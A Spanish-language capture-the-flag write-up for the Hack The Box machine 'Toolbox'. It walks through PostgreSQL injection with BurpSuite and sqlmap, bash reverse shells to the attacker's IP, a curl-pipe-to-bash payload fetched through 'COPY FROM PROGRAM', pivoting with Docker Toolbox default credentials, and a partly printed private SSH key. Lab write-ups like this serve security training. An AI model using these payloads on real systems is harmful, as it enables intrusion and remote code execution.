---
layout: single
title: Toolbox - Hack The Box
excerpt: "Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios que tiene activo, siendo que el puerto HTTP será la clave para resolver la máquina, pues podremos aplicar PostgreSQL Injection de dos formas, con BurpSuite y con SQLMAP para obtener una Shell de manera remota. Una vez dentro, descubrimos que estamos en una aplicación de varias, gracias a la herramienta Docker Toolbox que está usando, nos conectamos a la primera aplicación usando credenciales por defecto de esta herramienta y nos conectamos a una aplicación que copia todo el contenido de la máquina."
date: 2023-05-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-toolbox/toolbox_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - Docker Toolbox
  - Linux
  - PostgreSQL Pentesting
  - PostgreSQL Injection
  - Remote Code Execution - RCE
  - BurpSuite
  - SQLMAP
  - Pivoting
  - Default Credentials
  - OSCP Style
---
![](/assets/images/htb-writeup-toolbox/toolbox_logo.png)

Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios que tiene activo, siendo que el puerto **HTTP** será la clave para resolver la máquina, pues podremos aplicar **PostgreSQL Injection** de dos formas, con **BurpSuite** y con **SQLMAP** para obtener una **Shell** de manera remota. Una vez dentro, descubrimos que estamos en una aplicación de varias, gracias a la herramienta **Docker Toolbox** que está usando, nos conectamos a la primera aplicación usando credenciales por defecto de esta herramienta y nos conectamos a una aplicación que copia todo el contenido de la máquina.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Servicios">Enumeración de Servicios FTP, SMB y Análisis de Certificado HTTPS</a></li>
				<ul>
					<li><a href="#FTP">Enumeración Servicio FTP</a></li>
					<li><a href="#SMB">Enumeración Servicio SMB</a></li>
					<li><a href="#OpenSSL">Análisis de Certificado HTTPS</a></li>
				</ul>
				<li><a href="#HTTPS">Analizando Puerto 80</a></li>
				<li><a href="#Burp">Probando Vulnerabilidades con BurpSuite</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Burp2">Conectandonos de Manera Remota con BurpSuite</a></li>
				<li><a href="#SQL">Conectandonos de Manera Remota con SQLMAP</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#Docker">Pivoting a Aplicación de Docker</a></li>
				<li><a href="#Windows">Utilizando Llave Privada para Conectarnos a Windows por SSH</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```
ping -c 4 10.10.10.236                                        
PING 10.10.10.236 (10.10.10.236) 56(84) bytes of data.
64 bytes from 10.10.10.236: icmp_seq=1 ttl=127 time=150 ms
64 bytes from 10.10.10.236: icmp_seq=2 ttl=127 time=143 ms
64 bytes from 10.10.10.236: icmp_seq=3 ttl=127 time=143 ms
64 bytes from 10.10.10.236: icmp_seq=4 ttl=127 time=142 ms

--- 10.10.10.236 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 142.246/144.532/150.337/3.358 ms
```
Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.236 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 14:34 CST
Initiating SYN Stealth Scan at 14:34
Scanning 10.10.10.236 [65535 ports]
Discovered open port 135/tcp on 10.10.10.236
Discovered open port 139/tcp on 10.10.10.236
Discovered open port 21/tcp on 10.10.10.236
Discovered open port 445/tcp on 10.10.10.236
Discovered open port 22/tcp on 10.10.10.236
Discovered open port 443/tcp on 10.10.10.236
Discovered open port 47001/tcp on 10.10.10.236
Discovered open port 49666/tcp on 10.10.10.236
Discovered open port 49667/tcp on 10.10.10.236
Discovered open port 49664/tcp on 10.10.10.236
Discovered open port 49668/tcp on 10.10.10.236
Discovered open port 5985/tcp on 10.10.10.236
Discovered open port 49669/tcp on 10.10.10.236
Completed SYN Stealth Scan at 14:35, 32.06s elapsed (65535 total ports)
Nmap scan report for 10.10.10.236
Host is up, received user-set (0.15s latency).
Scanned at 2023-05-19 14:34:45 CST for 32s
Not shown: 59419 closed tcp ports (reset), 6103 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
22/tcp    open  ssh          syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 32.19 seconds
           Raw packets sent: 158419 (6.970MB) | Rcvd: 64760 (2.590MB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Vaya, hay muchos puertos abiertos, aunque me da un poco de curiosidad como es que hay un puerto SSH activo en una máquina Windows, veamos que nos dice el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>
```
nmap -sC -sV -p21,22,135,139,443,445,5985,47001,49664,49666,49667,49668,49669 10.10.10.236 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 14:36 CST
Nmap scan report for 10.10.10.236
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b1aa18199eaf79602192e6e97045a3f (RSA)
|   256 a24b5ac70ff399a13aca7d542876b2dd (ECDSA)
|_  256 ea08966023e2f44f8d05b31841352339 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_http-title: MegaLogistics
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Debian)
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-19T20:37:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.09 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Veo que el servicio **FTP** tiene activo el login **anonymous** y veo Samba también, además de una página web en el puerto 443. Primero, vamos a revisar el servicio **FTP** y luego la página web.

<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Servicios">Enumeración de Servicios FTP, SMB y Análisis de Certificado HTTPS</h2>

<h3 id="FTP">Enumeración Servicio FTP</h3>

Entremos:
```
ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:berserkwings): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Aun así, el escaneo de servicios, indica que hay un archivo llamado **docker-toolbox.exe**. Puedes verlo en el **FTP**:
```
ftp> ls
229 Entering Extended Passive Mode (|||58609|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
```
Podemos tratar de descargarlo como binario, porque si no tardara mucho en descargar y puede que con errores. Pero aun así, tardara demasiado, por lo que no lo descargaremos, vamos a investigar que es eso de **docker-toolbox.exe**:

**Docker Toolbox proporciona una forma de utilizar Docker en sistemas Windows antiguos que no cumplen con los requisitos mínimos del sistema para la aplicación Docker para Windows. El componente principal de Docker requiere un sistema operativo Linux para poderse ejecutar.**

Entonces, por eso tiene un puerto **SSH** activo, de momento, no veo nada más.

<h3 id="SMB">Enumeración Servicio SMB</h3>

Veamos si podemos enumerar archivos compartidos del servicio **SMB**:
```
smbclient -L 10.10.10.236 -N                                                                                 
session setup failed: NT_STATUS_ACCESS_DENIED
```
Nada, incluso, puedes checar si el servicio esta activo:
```
crackmapexec smb 10.10.10.236                                             
SMB  10.10.10.236    445    TOOLBOX   [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False)
```
Pues no, no podremos hacer nada por ahí.

<h3 id="OpenSSL">Análisis de Certificado HTTPS</h3>

Entonces, ya por último, vamos a ver qué información podemos obtener del certificado de HTTPS con la herramienta **openssl**:
```
openssl s_client -connect 10.10.10.236:443
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = GR, ST = Some-State, O = MegaLogistic Ltd, OU = Web, CN = admin.megalogistic.com, emailAddress = admin@megalogistic.com
verify error:num=18:self-signed certificate
verify return:1
depth=0 C = GR, ST = Some-State, O = MegaLogistic Ltd, OU = Web, CN = admin.megalogistic.com, emailAddress = admin@megalogistic.com
verify error:num=10:certificate has expired
notAfter=Feb 17 17:45:56 2021 GMT
verify return:1
depth=0 C = GR, ST = Some-State, O = MegaLogistic Ltd, OU = Web, CN = admin.megalogistic.com, emailAddress = admin@megalogistic.com
notAfter=Feb 17 17:45:56 2021 GMT
verify return:1
---
Certificate chain
 0 s:C = GR, ST = Some-State, O = MegaLogistic Ltd, OU = Web, CN = admin.megalogistic.com, emailAddress = admin@megalogistic.com
   i:C = GR, ST = Some-State, O = MegaLogistic Ltd, OU = Web, CN = admin.megalogistic.com, emailAddress = admin@megalogistic.com
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Feb 18 17:45:56 2020 GMT; NotAfter: Feb 17 17:45:56 2021 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
...
...
...
...
```
Podemos ver dos dominios, **megalogistic.com** y **admin.megalogistic.com**. Quiero suponer que la IP nos llevara a cualquiera de las dos, así que vamos a analizar la página web.

<h2 id="HTTPS">Analizando Puerto 80</h2>

Entremos.

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura1.png">
</p>

Ok, mete la opción avanzada para poder entrar y ver la página:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura2.png">
</p>

Bien, veamos que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura3.png">
</p>

Te diría que buscaras algo útil en la página, pero de una vez te digo que no hay nada. Tratemos de entrar al dominio **admin.megalogistic.com**, pero si tratamos de entrar, no saldrá nada, por lo que vamos a registrar este dominio en el **/etc/hosts**:
```
nano /etc/host

10.10.10.236 admin.megalogistic.com
```
Ahora, vuelve a cargar la página y ya debería verse:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura4.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura5.png">
</p>

Bien, aparece un login, te diría que trates de adivinar la contraseña, pero no podrás, sin embargo, podemos aplicar **SQL Injection** solamente poniendo una comilla en usuario y contraseña:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura6.png">
</p>

Vaya, vaya, mira que nos enfrentamos a **postgresql** por las siglas **pg**. Vamos a utilizar **BurpSuite** para analizar si se puede hacer **PostgreSQL Injection**.

<h2 id="Burp">Probando Vulnerabilidades con BurpSuite</h2>

Una vez que abras **BurpSuite**, captura el inicio del login con la comilla simple, debería verse así:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura7.png">
</p>

Ahora, mandalo al **Repeater** con **ctrl + r**:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura8.png">
</p>


Si investigamos vulnerabilidades en **Postgresql**, encontramos que **Hacktricks** tiene algunas formas de ver si se pueden inyectar comandos:
* https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql

Entonces probemos primero, si es posible la inyección, vamos a mandar una petición que dure 10 segundos en devolver un resultado:
```
; select pg_sleep(10);-- -
```
Esto lo vas a poner aún lado del dato, **username**, lanza la petición y debería tardar 10 segundos, si esto pasa, podemos inyectar comandos y si no, tendremos que hacerlo de otra forma:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura10.png">
</p>

Si funciona, utilizaremos esta vulnerabilidad para conectarnos al usuario de manera remota.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Existen dos formas de ganar acceso a la máquina de manera remota como usuario, la primera utilizando **BurpSuite** y la segunda utilizando **SQLMAP**, vamos a hacerlo de ambas formas.

<h2 id="Burp2">Conectandonos de Manera Remota con BurpSuite</h2>

De acuerdo con **Hacktricks**, hay una forma de conectarnos de manera remota a la máquina, creando una tabla que va a ejecutar una shell, hagámoslo por pasos:

* Crearemos primero la tabla que creara la shell para conectarnos de la misma forma en la que hicimos la petición anterior, utilizando el siguiente código:
```
CREATE TABLE cmd_exec(cmd_output text);
```
Bien, ahora en vez de URL encodearla, elimina los espacios y pon en su lugar el signo **+**, cuando mandes la petición, no debería mostrar ningún error, en caso de que diga que la tabla existe, usa el código de **Hacktricks** para eliminar esa tabla:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura11.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura12.png">
</p>

* Analizando un poco, sabemos que la máquina está usando Windows y Linux a la vez, utilizando un **Docker**, lo que podemos hacer, es conectarnos usando un archivo en **Bash** que llame a una **cmd** de la máquina víctima hacia la nuestra, a traves de la petición que hacemos en **BurpSuite**, que recordemos, puede ejecutar comandos. Crea un archivo que tenga una **Reverse Shell** en **Bash**:
```
nano pwned
#!/bin/bash
bash -i >& /dev/tcp/Tu_IP/443 0>&1
```
* Abre un servidor en Python en donde tengas este archivo:
```
python3 -m http.server 80                                     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
* En **BurpSuite**, usaremos **curl** para abrir ese archivo y ejecutarlo con **Bash**, utiliza el código que proporciona **Hacktricks**:
```
COPY cmd_exec FROM PROGRAM 'id';
```
Elimina **id** y pon la siguiente línea:
```
'curl+10.10.14.10/pwned|bash'
```
Y debería verse así:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura13.png">
</p>

* Abre una netcat:
```
nc -nvlp 443                                                  
listening on [any] 443 ...
```
* Manda la petición y observa la netcat:

<p align="center">
<img src="/assets/images/htb-writeup-toolbox/Captura14.png">
</p>

```
nc -nvlp 443                                                  
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.236] 50059
bash: cannot set terminal process group (4101): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ whoami
whoami
postgres
```
Excelente, puedes obtener una shell interactiva, pero debo advertirte que obtener la shell de esta forma, es algo inestable y puede desconectarse mandando a la mierda todo, por lo que yo recomiendo la segunda forma, por ser más estable.

<h2 id="SQL">Conectandonos de Manera Remota con SQLMAP</h2>

Para utilizar **SQLMAP**, necesitamos la petición web que podemos copiar de **BurpSuite**, así que vamos a usar la primera petición, pero vas a cambiar la comilla simple por **admin** porque si no la petición por **SQLMAP** fallara:
```
POST / HTTP/1.1
Host: admin.megalogistic.com
Cookie: PHPSESSID=4721807843bbe54fe5b1d3dde0f6855d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://admin.megalogistic.com
Referer: https://admin.megalogistic.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

username=admin&password=admin
```
Ahora, usa este archivo con **SQLMAP** para ver si podemos obtener información de las bases de datos de la página web:
```
sqlmap -r request.txt --dbs --force-ssl --batch
       __H__                                                                                                                           
 ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                               
|_ -| . [']     | .'| . |                                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                           
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:56:36 /2023-05-19/

[20:56:36] [INFO] parsing HTTP request from 'request.txt'
[20:56:36] [INFO] testing connection to the target URL
[20:56:37] [INFO] checking if the target is protected by some kind of WAF/IPS
...
...
...
[20:58:13] [INFO] fetching database (schema) names
[20:58:14] [INFO] retrieved: 'public'
[20:58:15] [INFO] retrieved: 'pg_catalog'
[20:58:15] [INFO] retrieved: 'information_schema'
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

[20:59:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/admin.megalogistic.com'

[*] ending @ 20:59:00 /2023-05-19/
```
Hay 3 bases de datos, para que no pierdas tiempo, vamos a ver la base de datos **public** y verás algo interesante en su contenido:
```
sqlmap -r request.txt --dbs --force-ssl --batch -D public --dump-all
       __H__                                                                                                                           
 ___ ___[.]_____ ___ ___  {1.7.2#stable}                                                                                               
|_ -| . ["]     | .'| . |                                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                           
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:00:48 /2023-05-19/
...
...
...
[21:02:28] [WARNING] no clear password(s) found                                                                                       
Database: public
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+
```
Tenemos un usuario y contraseña, cambia eso en el archivo que creaste de la petición y con **SQLMAP**, vamos a obtener una shell temporal para ver si podemos ejecutar comandos:
```
sqlmap -r request.txt --force-ssl --batch --os-shell           
       __H__                                                                                                                           
 ___ ___[']_____ ___ ___  {1.7.2#stable}                                                                                               
|_ -| . [.]     | .'| . |                                                                                                              
|___|_  ["]_|_|_|__,|  _|                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                           
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:04:38 /2023-05-19/
...
...
...
[21:04:47] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[21:05:02] [INFO] retrieved: 'postgres'
command standard output: 'postgres'
os-shell>
```
Excelente, podemos usar comandos, ya solo conéctate de manera remota con el mismo código de la **Reverse Shell**, obviamente, abre una netcat:
```
[21:05:02] [INFO] retrieved: 'postgres'
command standard output: 'postgres'
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'
do you want to retrieve the command standard output? [Y/n/a] Y
```
Mira la netcat:
```
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.236] 50373
bash: cannot set terminal process group (4639): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ whoami
whoami
postgres
```
Obtén una shell interactiva con Python o Bash.

La flag del usuario, está en el directorio **postgres**:
```
ostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ cd ~
postgres@bc56e3cc55e9:/var/lib/postgresql$ ls
11  user.txt
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
...
```


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Docker">Pivoting a Aplicación de Docker</h2>

Enumerando un poco la máquina, no encontraremos mucho que podamos hacer. Si usamos el comando **ifconfig** veremos algo muy interesante:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 4301  bytes 427290 (417.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3759  bytes 3537678 (3.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8202  bytes 3090994 (2.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8202  bytes 3090994 (2.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Observa la IP, debería terminar en 1, pero no es así. Si recordamos la herramienta que están usando es **Docker-toolbox.exe**, por lo que pueden tener varias aplicaciones web abiertas y si investigamos más sobre esta herramienta, encontraremos que tiene contraseñas por defecto:
* https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password

Ahí nos dicen que tiene las siguientes credenciales:
* user: docker
* pwd: tcuser

Vamos a usar estas credenciales para loguearnos al servicio **SSH** desde donde estamos:
```
postgres@bc56e3cc55e9:/home/tony$ ssh docker@172.17.0.1
docker@172.17.0.1's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ whoami
docker
```
Muy bien, si usamos el comando **ifconfig**, verás la diferencia de la aplicación en la que estamos:
```
docker@box:~$ ifconfig                               
docker0   Link encap:Ethernet  HWaddr 02:42:EB:C9:47:65  
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          inet6 addr: fe80::42:ebff:fec9:4765/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3953 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4513 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3500230 (3.3 MiB)  TX bytes:445705 (435.2 KiB)
...
...
...
...
```
Puedes verificar tus privilegios y verás que podemos usar cualquier comando de Root:
```
docker@box:~$ sudo -l                                
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL
```
Entonces, quiero pensar que ya somos Root o estamos en la máquina principal de Windows, no lo sé, hay que enumerar un poco a ver que encontramos.

Enumerando la raíz, encontramos un directorio curioso, llamado **c**:
```
docker@box:~$ cd /                                                             
cd /
docker@box:/$ ls                                                               
ls
bin           home          linuxrc       root          sys
c             init          mnt           run           tmp
dev           lib           opt           sbin          usr
etc           lib64         proc          squashfs.tgz  var
docker@box:/$ cd c                                                             
cd c
docker@box:/c$ ls                                                              
ls
Users
docker@box:/c/Users$ ls                                                        
ls
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony
```
Hay un directorio llamado **Administrator**, veamos que contiene:
```
docker@box:/c/Users$ cd Administrator                                          
cd Administrator
docker@box:/c/Users/Administrator$ ls -la                                      
ls -la
total 1433
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 .
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
drwxrwxrwx    1 docker   staff         4096 May 19 20:29 .VirtualBox
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 .ssh
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 3D Objects
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 AppData
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 Application Data
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Contacts
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Cookies
dr-xr-xr-x    1 docker   staff            0 Feb  8  2021 Desktop
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 Documents
dr-xr-xr-x    1 docker   staff            0 Apr  5  2021 Downloads
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Favorites
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Link
```
Ok, veamos el directorio **Desktop**:
```
docker@box:/c/Users/Administrator/Desktop$ ls                                  
ls
desktop.ini  root.txt
docker@box:/c/Users/Administrator/Desktop$ cat root.txt                        
.cat root.txt
...
```
a...entonces, esto es lo mismo que la máquina Windows, es una copia por así decirlo. Podemos conectarnos a Windows, utilizando la llave privada SSH.

<h2 id="Windows">Utilizando Llave Privada para Conectarnos a Windows por SSH</h2>

Vamos a copiar la llave privada del directorio oculto **.ssh**:
```
docker@box:/c/Users/Administrator$ cd .ssh                                     
cd .ssh
docker@box:/c/Users/Administrator/.ssh$ ls -la                                 
ls -la
total 18
drwxrwxrwx    1 docker   staff         4096 Feb 19  2020 .
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 ..
-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 authorized_keys
-rwxrwxrwx    1 docker   staff         1675 Feb 19  2020 id_rsa
-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 id_rsa.pub
-rwxrwxrwx    1 docker   staff          348 Feb 19  2020 known_hosts
docker@box:/c/Users/Administrator/.ssh$ cat id_rsa                             
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
...
...
...
...
```
